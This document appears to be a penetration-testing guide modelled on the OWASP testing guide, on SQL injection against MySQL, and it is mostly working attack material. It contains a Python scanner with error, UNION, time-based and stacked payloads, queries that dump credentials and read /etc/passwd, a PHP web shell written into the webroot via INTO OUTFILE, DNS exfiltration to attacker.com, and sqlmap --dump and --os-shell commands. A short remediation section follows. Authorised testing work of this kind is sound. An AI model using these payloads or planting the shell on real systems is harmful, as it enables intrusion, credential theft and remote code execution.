# WSTG-INPV-05.2: Testing for SQL Injection - MySQL

## Test ID
WSTG-INPV-05.2

## Test Name
Testing for SQL Injection - MySQL

## High-Level Description

MySQL-specific SQL injection testing leverages MySQL's unique syntax, functions, and features. MySQL is widely used in web applications (LAMP stack), making it a common target. Key features include information_schema, comment syntax, and specific functions for data extraction and exploitation.

---

## What to Check

- [ ] MySQL error messages
- [ ] information_schema access
- [ ] MySQL-specific functions
- [ ] Stacked queries
- [ ] File operations (LOAD_FILE, INTO OUTFILE)
- [ ] User-defined functions

---

## How to Test

### Step 1: MySQL Detection

```bash
#!/bin/bash
TARGET="https://target.com/product?id="

echo "[*] Testing for MySQL database..."

# Error-based detection
curl -s "${TARGET}'" | grep -iE "mysql|MariaDB|syntax.*MySQL|Warning.*mysql"

# MySQL comment syntax
curl -s "${TARGET}1--+"
curl -s "${TARGET}1#"
curl -s "${TARGET}1/*comment*/"

# Version detection
curl -s "${TARGET}1' AND 1=1 UNION SELECT @@version-- -"

# String concatenation (MySQL uses CONCAT or space)
curl -s "${TARGET}1' AND 'test'='te''st"
```

### Step 2: MySQL SQLi Tester

```python
#!/usr/bin/env python3
"""
MySQL SQL Injection Tester
"""

import requests
import re
import time

class MySQLSQLiTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # MySQL error patterns
    MYSQL_ERRORS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"Warning.*mysqli_",
        r"MySqlException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"Unclosed quotation mark",
        r"You have an error in your SQL syntax",
    ]

    # MySQL-specific payloads
    MYSQL_PAYLOADS = {
        'error_based': [
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)-- -",
            "' AND EXP(~(SELECT * FROM (SELECT @@version)x))-- -",
            "' AND JSON_KEYS((SELECT CONVERT((SELECT @@version) USING utf8)))-- -",
        ],
        'union_based': [
            "' UNION SELECT NULL-- -",
            "' UNION SELECT NULL,NULL-- -",
            "' UNION SELECT NULL,NULL,NULL-- -",
            "' UNION SELECT 1,@@version,3-- -",
            "' UNION SELECT 1,user(),3-- -",
            "' UNION SELECT 1,database(),3-- -",
        ],
        'boolean_based': [
            ("' AND 1=1-- -", "' AND 1=2-- -"),
            ("' AND 'a'='a", "' AND 'a'='b"),
            ("1 AND 1=1", "1 AND 1=2"),
            ("' AND (SELECT SUBSTRING(@@version,1,1))='5'-- -", "' AND (SELECT SUBSTRING(@@version,1,1))='4'-- -"),
        ],
        'time_based': [
            "' AND SLEEP(5)-- -",
            "' OR SLEEP(5)-- -",
            "' AND (SELECT SLEEP(5))-- -",
            "1' AND SLEEP(5)#",
            "' AND IF(1=1,SLEEP(5),0)-- -",
            "' AND BENCHMARK(5000000,SHA1('test'))-- -",
        ],
        'stacked': [
            "'; SELECT SLEEP(5);-- -",
            "'; INSERT INTO logs VALUES('injected');-- -",
        ],
    }

    def detect_mysql(self, param):
        """Detect if backend is MySQL"""
        print(f"[*] Detecting MySQL database...")

        detection_payloads = [
            "' AND 1=1-- -",
            "' AND 1=1#",
            "1 AND @@version",
            "' UNION SELECT @@version-- -",
        ]

        for payload in detection_payloads:
            try:
                response = self.session.get(self.url, params={param: payload})

                for pattern in self.MYSQL_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] MySQL database detected!")
                        return True

                # Check for MySQL-specific response
                if 'mysql' in response.text.lower() or 'mariadb' in response.text.lower():
                    print(f"[+] MySQL/MariaDB detected!")
                    return True

            except Exception as e:
                pass

        return False

    def test_error_based(self, param):
        """Test MySQL error-based injection"""
        print(f"\n[*] Testing MySQL error-based injection...")

        for payload in self.MYSQL_PAYLOADS['error_based']:
            try:
                response = self.session.get(self.url, params={param: payload})

                # Look for version or data in response
                if re.search(r'\d+\.\d+\.\d+', response.text):
                    print(f"[VULN] Error-based SQLi!")
                    print(f"  Payload: {payload[:60]}")
                    self.findings.append({
                        'type': 'MySQL Error-based SQLi',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_union_based(self, param):
        """Test MySQL UNION-based injection"""
        print(f"\n[*] Testing MySQL UNION-based injection...")

        # Find column count
        for i in range(1, 15):
            null_list = ','.join(['NULL'] * i)
            payload = f"' UNION SELECT {null_list}-- -"

            try:
                response = self.session.get(self.url, params={param: payload})

                if response.status_code == 200:
                    has_error = False
                    for pattern in self.MYSQL_ERRORS:
                        if re.search(pattern, response.text):
                            has_error = True
                            break

                    if not has_error:
                        print(f"[+] Column count: {i}")

                        # Extract version
                        version_payload = f"' UNION SELECT {','.join(['NULL']*(i-1))},@@version-- -"
                        version_response = self.session.get(self.url, params={param: version_payload})

                        version_match = re.search(r'(\d+\.\d+\.\d+(?:-[a-zA-Z]+)?)', version_response.text)
                        if version_match:
                            print(f"[+] MySQL Version: {version_match.group(1)}")

                        self.findings.append({
                            'type': 'MySQL UNION-based SQLi',
                            'columns': i,
                            'severity': 'Critical'
                        })
                        return True

            except Exception as e:
                pass

        return False

    def test_time_based(self, param):
        """Test MySQL time-based blind injection"""
        print(f"\n[*] Testing MySQL time-based injection...")

        # Baseline
        start = time.time()
        self.session.get(self.url, params={param: 'test'}, timeout=30)
        baseline = time.time() - start

        for payload in self.MYSQL_PAYLOADS['time_based']:
            try:
                start = time.time()
                self.session.get(self.url, params={param: payload}, timeout=30)
                response_time = time.time() - start

                if response_time > baseline + 4:
                    print(f"[VULN] Time-based SQLi!")
                    print(f"  Payload: {payload}")
                    print(f"  Response time: {response_time:.2f}s")
                    self.findings.append({
                        'type': 'MySQL Time-based Blind SQLi',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except requests.exceptions.Timeout:
                print(f"[VULN] Time-based SQLi (timeout)!")
                self.findings.append({
                    'type': 'MySQL Time-based Blind SQLi',
                    'payload': payload,
                    'severity': 'Critical'
                })
                return True
            except Exception as e:
                pass

        return False

    def test_file_operations(self, param):
        """Test MySQL file operations (LOAD_FILE, INTO OUTFILE)"""
        print(f"\n[*] Testing MySQL file operations...")

        file_payloads = [
            "' UNION SELECT LOAD_FILE('/etc/passwd')-- -",
            "' UNION SELECT LOAD_FILE(0x2f6574632f706173737764)-- -",  # Hex encoded
        ]

        for payload in file_payloads:
            try:
                response = self.session.get(self.url, params={param: payload})

                if 'root:' in response.text or 'bin/bash' in response.text:
                    print(f"[VULN] File read via LOAD_FILE!")
                    self.findings.append({
                        'type': 'MySQL File Read',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def run_tests(self, param='id'):
        """Run all MySQL SQLi tests"""
        if self.detect_mysql(param):
            self.test_error_based(param)
            self.test_union_based(param)
            self.test_time_based(param)
            self.test_file_operations(param)

        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("MYSQL SQL INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo MySQL SQLi vulnerabilities found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:70]}")

# Usage
tester = MySQLSQLiTester("https://target.com/product")
tester.run_tests(param='id')
```

### Step 3: MySQL Data Extraction Queries

```sql
-- MySQL Version
SELECT @@version
SELECT VERSION()

-- Current User
SELECT USER()
SELECT CURRENT_USER()
SELECT SYSTEM_USER()

-- Current Database
SELECT DATABASE()

-- List Databases
SELECT schema_name FROM information_schema.schemata
SELECT DISTINCT(db) FROM mysql.db

-- List Tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT table_name FROM information_schema.tables WHERE table_schema='target_db'

-- List Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Extract Data
SELECT CONCAT(username,':',password) FROM users

-- Read Files
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE(0x2f6574632f706173737764)

-- Write Files (requires FILE privilege and secure_file_priv)
SELECT 'content' INTO OUTFILE '/var/www/html/shell.php'
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- DNS Exfiltration
SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))
```

### Step 4: SQLMap MySQL Commands

```bash
# Basic MySQL detection
sqlmap -u "https://target.com/product?id=1" --dbms=mysql

# Get MySQL version
sqlmap -u "https://target.com/product?id=1" --dbms=mysql --banner

# List databases
sqlmap -u "https://target.com/product?id=1" --dbms=mysql --dbs

# List tables
sqlmap -u "https://target.com/product?id=1" --dbms=mysql -D target_db --tables

# List columns
sqlmap -u "https://target.com/product?id=1" --dbms=mysql -D target_db -T users --columns

# Dump data
sqlmap -u "https://target.com/product?id=1" --dbms=mysql -D target_db -T users --dump

# Read file
sqlmap -u "https://target.com/product?id=1" --dbms=mysql --file-read=/etc/passwd

# Write file (shell)
sqlmap -u "https://target.com/product?id=1" --dbms=mysql --os-shell

# Specific techniques
sqlmap -u "https://target.com/product?id=1" --dbms=mysql --technique=U  # UNION only
sqlmap -u "https://target.com/product?id=1" --dbms=mysql --technique=T  # Time-based only
```

---

## Tools

| Tool | Purpose |
|------|---------|
| SQLMap | Automated MySQL SQLi |
| MySQL Client | Database client |
| Burp Suite | Manual testing |
| MySQL Workbench | GUI client |

---

## Remediation

```php
<?php
// PHP - PDO prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

// PHP - MySQLi prepared statements
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
?>
```

```python
# Python - mysql-connector
import mysql.connector

cursor = connection.cursor(prepared=True)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| MySQL SQLi with FILE privilege | 9.8 | Critical |
| MySQL SQLi data extraction | 8.6 | High |
| MySQL Blind SQLi | 8.6 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-89** | SQL Injection |

---

## Checklist

```
[ ] MySQL database detected
[ ] Error-based injection tested
[ ] UNION-based injection tested
[ ] Time-based injection tested
[ ] File operations tested
[ ] Data extraction attempted
[ ] Findings documented
```
